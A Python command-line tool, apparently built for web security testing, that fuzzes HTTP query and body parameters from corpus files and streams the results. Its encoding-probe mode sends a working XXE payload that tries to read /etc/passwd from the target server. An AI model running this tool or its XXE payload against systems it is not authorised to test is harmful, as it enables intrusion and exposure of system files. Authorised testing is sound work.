#!/usr/bin/env python3
# /// script
# requires-python = ">=3.11"
# dependencies = ["requests>=2.31", "urllib3>=2.0"]
# ///
"""Execute a fuzz corpus against an HTTP target and stream results as NDJSON.

One parameter is varied per request; all other parameters retain original baseline values.
Results stream to stdout as requests complete. Progress and errors go to stderr.

Use --probe-encodings to send encoding variation probes (XML+XXE, form-encoded, etc.)
using original manifest parameter values. Does not run corpus fuzz.
"""

import argparse
import json
import queue
import sys
import threading
import time
import urllib.parse
from dataclasses import asdict, dataclass, field
from pathlib import Path
from typing import Any
from xml.sax.saxutils import escape as xml_escape

import requests
import urllib3


@dataclass
class FuzzResult:
    param: str
    value: str
    status_code: int | None
    response_time_ms: int
    content_length: int
    content_type: str
    body_preview: str
    error: str | None
    probe_encoding: str | None = field(default=None)


def _load_manifest(path: str) -> dict[str, Any]:
    try:
        with open(path) as f:
            return json.load(f)
    except (OSError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": f"Cannot load manifest '{path}': {exc}"}))
        sys.exit(1)


def _load_corpus(corpus_dir: str, target_params: list[str]) -> dict[str, list[str]]:
    """Load corpus files for each parameter. Returns {param_name: [values]}."""
    corpus: dict[str, list[str]] = {}
    corpus_path = Path(corpus_dir)

    for param in target_params:
        corpus_file = corpus_path / f"{param}.txt"
        if not corpus_file.exists():
            print(f"  [warn] No corpus file for '{param}' at {corpus_file}", file=sys.stderr)
            continue
        lines = corpus_file.read_text(encoding="utf-8").splitlines()
        values = [line for line in lines if line.strip()]
        if values:
            corpus[param] = values
        else:
            print(f"  [warn] Corpus file for '{param}' is empty, skipping", file=sys.stderr)

    return corpus


def _get_fuzzable_params(manifest: dict[str, Any], only: list[str] | None) -> list[str]:
    """Return names of all fuzzable parameters from the manifest."""
    params: list[str] = []

    for p in manifest.get("query_params", []):
        if p.get("fuzzable", True):
            params.append(p["name"])

    for p in manifest.get("body_params", []):
        if p.get("fuzzable", True):
            params.append(p["name"])

    if only:
        params = [p for p in params if p in only]

    return params


def _build_base_request(manifest: dict[str, Any]) -> dict[str, Any]:
    """Build the base request kwargs from original manifest values."""
    method = manifest["method"]
    url = manifest["url"]
    headers = {h["name"]: h["value"] for h in manifest.get("headers", [])}
    body_format = manifest.get("body_format", "")
    body_params = manifest.get("body_params", [])

    base: dict[str, Any] = {"method": method, "url": url, "headers": headers}

    if body_params and body_format == "json":
        base["_body_json"] = {p["name"]: p["value"] for p in body_params}
        base["headers"] = {k: v for k, v in headers.items() if k.lower() != "content-type"}
    elif body_params and body_format == "form":
        base["_body_form"] = {p["name"]: p["value"] for p in body_params}
        base["headers"] = {k: v for k, v in headers.items() if k.lower() != "content-type"}

    return base


def _build_fuzz_request(
    base: dict[str, Any],
    param: str,
    value: str,
    manifest: dict[str, Any],
) -> dict[str, Any]:
    """Build request kwargs with one parameter replaced by the fuzz value."""
    req = {k: v for k, v in base.items() if not k.startswith("_")}
    req["headers"] = dict(base["headers"])

    all_query = {p["name"] for p in manifest.get("query_params", [])}
    all_body = {p["name"] for p in manifest.get("body_params", [])}
    body_format = manifest.get("body_format", "")

    parsed_url = req["url"]

    if param in all_query:
        parsed = urllib.parse.urlparse(parsed_url)
        qs = dict(urllib.parse.parse_qsl(parsed.query, keep_blank_values=True))
        qs[param] = value
        new_query = urllib.parse.urlencode(qs)
        parsed_url = urllib.parse.urlunparse(parsed._replace(query=new_query))
        req["url"] = parsed_url

    elif param in all_body and body_format == "json":
        body = dict(base.get("_body_json", {}))
        original_type = next(
            (p.get("type", "string") for p in manifest.get("body_params", [])
             if p["name"] == param),
            "string",
        )
        body[param] = _coerce_value(value, original_type)
        req["json"] = body

    elif param in all_body and body_format == "form":
        body = dict(base.get("_body_form", {}))
        body[param] = value
        req["data"] = body

    return req


def _coerce_value(value: str, original_type: str) -> Any:
    """Try to coerce a string fuzz value to the original parameter type."""
    if value == "null":
        return None
    if value == "true":
        return True
    if value == "false":
        return False
    if original_type in ("integer", "float"):
        try:
            return float(value) if "." in value else int(value)
        except (ValueError, OverflowError):
            pass
    if original_type == "boolean":
        if value in ("1", "yes", "on"):
            return True
        if value in ("0", "no", "off"):
            return False
    return value


# ── Encoding probe helpers ────────────────────────────────────────────────────


def _build_xml_xxe_probe(body_params: list[dict[str, Any]]) -> str:
    """Build XML body with DOCTYPE XXE injection on the first fuzzable parameter."""
    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
    if not fuzzable:
        return ""
    first = fuzzable[0]
    rest = fuzzable[1:]
    inner = f"<{first['name']}>&xxe;</{first['name']}>"
    inner += "".join(
        f"<{p['name']}>{xml_escape(str(p.get('value', '')))}</{p['name']}>"
        for p in rest
    )
    return (
        '<?xml version="1.0"?>'
        '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        f"<root>{inner}</root>"
    )


def _build_form_body(body_params: list[dict[str, Any]]) -> str:
    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
    return urllib.parse.urlencode(
        {p["name"]: str(p.get("value", "")) for p in fuzzable}
    )


def _build_json_body(body_params: list[dict[str, Any]]) -> str:
    fuzzable = [p for p in body_params if p.get("fuzzable", True)]
    return json.dumps({p["name"]: p.get("value", "") for p in fuzzable})


def _run_encoding_probes(
    manifest: dict[str, Any],
    timeout: float,
    no_verify: bool,
    dry_run: bool = False,
) -> None:
    """Send encoding variation probes and stream NDJSON results."""
    body_format = manifest.get("body_format", "")
    body_params = manifest.get("body_params", [])
    fuzzable = [p for p in body_params if p.get("fuzzable", True)]

    if not fuzzable:
        print(json.dumps({"error": "No fuzzable body params — cannot construct encoding probes."}))
        sys.exit(1)

    # Build probe list, skipping the format the request already uses
    probes: list[tuple[str, str, bytes]] = []  # (label, content_type, body)

    if body_format != "xml":
        xml_body = _build_xml_xxe_probe(fuzzable)
        if xml_body:
            probes.append(("application/xml+xxe", "application/xml", xml_body.encode()))

    if body_format not in ("form",):
        form_body = _build_form_body(fuzzable)
        probes.append(("application/x-www-form-urlencoded", "application/x-www-form-urlencoded",
                        form_body.encode()))

    if body_format not in ("json", ""):
        json_body = _build_json_body(fuzzable)
        probes.append(("application/json", "application/json", json_body.encode()))

    if not probes:
        print(json.dumps({"error": "No alternative encodings to probe for this body_format."}))
        sys.exit(1)

    if dry_run:
        print(f"Encoding probes planned: {len(probes)}\n")
        for label, _, body in probes:
            preview = body[:100].decode("utf-8", errors="replace")
            if len(body) > 100:
                preview += "..."
            print(f"  {label}:\n    {preview}\n")
        return

    base_headers = {
        h["name"]: h["value"]
        for h in manifest.get("headers", [])
        if h["name"].lower() != "content-type"
    }
    method = manifest["method"]
    url = manifest["url"]

    print(f"  [encoding probes] Sending {len(probes)} probes to {url}", file=sys.stderr)

    session = requests.Session()
    session.verify = not no_verify

    try:
        for label, content_type, body in probes:
            headers = {**base_headers, "Content-Type": content_type}
            start = time.monotonic()
            try:
                resp = session.request(
                    method=method, url=url, headers=headers, data=body, timeout=timeout,
                )
                elapsed_ms = int((time.monotonic() - start) * 1000)
                body_preview = resp.text[:500].replace("\n", " ").replace("\r", "")
                result = FuzzResult(
                    param="Content-Type", value=label,
                    status_code=resp.status_code, response_time_ms=elapsed_ms,
                    content_length=len(resp.content),
                    content_type=resp.headers.get("content-type", ""),
                    body_preview=body_preview, error=None, probe_encoding=label,
                )
            except requests.exceptions.RequestException as exc:
                elapsed_ms = int((time.monotonic() - start) * 1000)
                result = FuzzResult(
                    param="Content-Type", value=label,
                    status_code=None, response_time_ms=elapsed_ms,
                    content_length=0, content_type="", body_preview="",
                    error=str(exc), probe_encoding=label,
                )
            print(json.dumps(asdict(result)), flush=True)
    finally:
        session.close()

    print(f"Done. {len(probes)} encoding probes emitted.", file=sys.stderr)


# ── Corpus fuzz ───────────────────────────────────────────────────────────────


def _send_one(
    session: requests.Session,
    req_kwargs: dict[str, Any],
    param: str,
    value: str,
    timeout: float,
) -> FuzzResult:
    start = time.monotonic()
    try:
        resp = session.request(timeout=timeout, **req_kwargs)
        elapsed_ms = int((time.monotonic() - start) * 1000)
        body = resp.text[:500].replace("\n", " ").replace("\r", "")
        return FuzzResult(
            param=param, value=value, status_code=resp.status_code,
            response_time_ms=elapsed_ms, content_length=len(resp.content),
            content_type=resp.headers.get("content-type", ""),
            body_preview=body, error=None,
        )
    except requests.exceptions.Timeout:
        elapsed_ms = int((time.monotonic() - start) * 1000)
        return FuzzResult(
            param=param, value=value, status_code=None,
            response_time_ms=elapsed_ms, content_length=0,
            content_type="", body_preview="", error="timeout",
        )
    except requests.exceptions.RequestException as exc:
        elapsed_ms = int((time.monotonic() - start) * 1000)
        return FuzzResult(
            param=param, value=value, status_code=None,
            response_time_ms=elapsed_ms, content_length=0,
            content_type="", body_preview="", error=str(exc),
        )


def _worker(
    task_queue: "queue.Queue[tuple[str, str] | None]",
    result_queue: "queue.Queue[FuzzResult | Exception]",
    session: requests.Session,
    base_request: dict[str, Any],
    manifest: dict[str, Any],
    timeout: float,
    delay_ms: float,
) -> None:
    while True:
        item = task_queue.get()
        if item is None:
            task_queue.task_done()
            break
        param, value = item
        try:
            req = _build_fuzz_request(base_request, param, value, manifest)
            result = _send_one(session, req, param, value, timeout)
        except Exception as exc:
            result_queue.put(exc)
        else:
            result_queue.put(result)
        task_queue.task_done()
        if delay_ms > 0:
            time.sleep(delay_ms / 1000.0)


def _print_dry_run(corpus: dict[str, list[str]]) -> None:
    rows = [(p, v if len(v) <= 50 else v[:47] + "...") for p, vs in corpus.items() for v in vs]

    if not rows:
        print("No fuzz tasks — corpus is empty.")
        return

    print(f"Dry run: {len(rows)} requests planned\n")
    col1 = max(len(r[0]) for r in rows + [("Parameter", "")])
    col2 = max(len(r[1]) for r in rows + [("", "Value")])
    header = f"{'Parameter'.ljust(col1)}  {'Value'.ljust(col2)}"
    print(header)
    print("-" * len(header))
    for param, value in rows:
        print(f"{param.ljust(col1)}  {value.ljust(col2)}")


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Fuzz HTTP parameters from corpus files and stream NDJSON results."
    )
    parser.add_argument("--manifest", required=True, metavar="PATH")
    parser.add_argument("--corpus-dir", default="./corpus", metavar="PATH")
    parser.add_argument("--threads", type=int, default=5, metavar="N")
    parser.add_argument("--delay-ms", type=float, default=1000.0, metavar="MS")
    parser.add_argument("--timeout", type=float, default=10.0, metavar="SECS")
    parser.add_argument("--no-verify", action="store_true")
    parser.add_argument("--param", action="append", dest="params", metavar="NAME",
                        help="Only fuzz this parameter (repeat to fuzz multiple)")
    parser.add_argument("--dry-run", action="store_true",
                        help="Print request plan without sending")
    parser.add_argument(
        "--probe-encodings", action="store_true",
        help=(
            "Send encoding variation probes (XML+XXE, form-encoded, JSON) using original "
            "manifest values. Mutually exclusive with corpus fuzz — does not read corpus files."
        ),
    )
    args = parser.parse_args()

    manifest = _load_manifest(args.manifest)

    if args.probe_encodings:
        if args.no_verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
        _run_encoding_probes(manifest, args.timeout, args.no_verify, dry_run=args.dry_run)
        return

    fuzzable = _get_fuzzable_params(manifest, args.params)

    if not fuzzable:
        print(json.dumps({"error": (
            "No fuzzable parameters found in manifest. "
            "Check that body_params or query_params are present and fuzzable=true."
        )}))
        sys.exit(1)

    corpus = _load_corpus(args.corpus_dir, fuzzable)

    if not corpus:
        print(json.dumps({"error": (
            f"No corpus files found in '{args.corpus_dir}'. "
            "Generate corpus files first (e.g. corpus/email.txt with one value per line)."
        )}))
        sys.exit(1)

    if args.dry_run:
        _print_dry_run(corpus)
        return

    if args.no_verify:
        urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    base_request = _build_base_request(manifest)

    total = sum(len(v) for v in corpus.values())
    print(
        f"Starting fuzz: {total} requests across {len(corpus)} parameters "
        f"({args.threads} threads, {args.delay_ms}ms delay)",
        file=sys.stderr,
    )

    task_q: queue.Queue[tuple[str, str] | None] = queue.Queue()
    result_q: queue.Queue[FuzzResult | Exception] = queue.Queue()

    for param, values in corpus.items():
        for value in values:
            task_q.put((param, value))

    for _ in range(args.threads):
        task_q.put(None)

    sessions = [requests.Session() for _ in range(args.threads)]
    for s in sessions:
        s.verify = not args.no_verify

    workers = []
    for i in range(args.threads):
        t = threading.Thread(
            target=_worker,
            args=(task_q, result_q, sessions[i], base_request, manifest,
                  args.timeout, args.delay_ms),
            daemon=True,
        )
        t.start()
        workers.append(t)

    completed = 0
    while completed < total:
        try:
            item = result_q.get(timeout=args.timeout + 5)
        except queue.Empty:
            print("  [warn] Result queue timed out waiting for worker", file=sys.stderr)
            break

        if isinstance(item, Exception):
            print(f"  [error] Worker exception: {item}", file=sys.stderr)
        else:
            print(json.dumps(asdict(item)), flush=True)

        completed += 1
        if completed % 50 == 0:
            print(f"  [{completed}/{total}]", file=sys.stderr)

    for t in workers:
        t.join(timeout=5)

    for s in sessions:
        s.close()

    print(f"Done. {completed} results emitted.", file=sys.stderr)


if __name__ == "__main__":
    main()
